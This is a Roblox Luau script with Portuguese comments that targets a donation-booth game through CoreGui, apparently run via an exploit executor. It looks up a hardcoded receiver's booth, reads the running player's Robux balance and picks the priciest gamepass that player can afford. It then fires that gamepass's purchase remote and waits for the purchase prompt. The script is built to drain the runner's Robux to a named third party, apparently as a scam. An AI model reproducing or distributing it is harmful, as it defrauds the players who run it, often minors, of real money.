local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

-- Substitua pelo username do jogador que você quer doar
local Username = "Ian_wp27"

-- Tenta pegar o UserId
local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success then
    warn("Usuário inválido!")
    return
end

local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    Players.LocalPlayer:Kick("Receiver not found!")
    return
end

-- Pega o saldo de Robux do jogador (do script original)
local success, userRobux = pcall(function()
    return Remotes.Function("GetUserRobux"):InvokeServer()
end)

if not success or not userRobux then
    warn("Não foi possível obter saldo de Robux!")
    return
end

local asset

-- Função para escolher o asset mais caro que consegue pagar
local function Purchase()
    local maxPrice = 0
    asset = nil
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        local assetType = v:GetAttribute("AssetType")
        local price = v:GetAttribute("AssetPrice")
        local assetId = v:GetAttribute("AssetId")
        if assetType == "Gamepass" and price and price <= userRobux and
           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, assetId) then
            if price > maxPrice then
                maxPrice = price
                asset = v
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, maxPrice)
        print("Comprando asset de preço:", maxPrice)
    else
        warn("Nenhum asset disponível ou Prompt inválido!")
    end
end

-- Espera o PurchasePromptApp aparecer (compatível mobile)
local PurchasePromptApp
repeat
    PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
    task.wait(0.1)
until PurchasePromptApp

-- Executa a compra
Purchase()
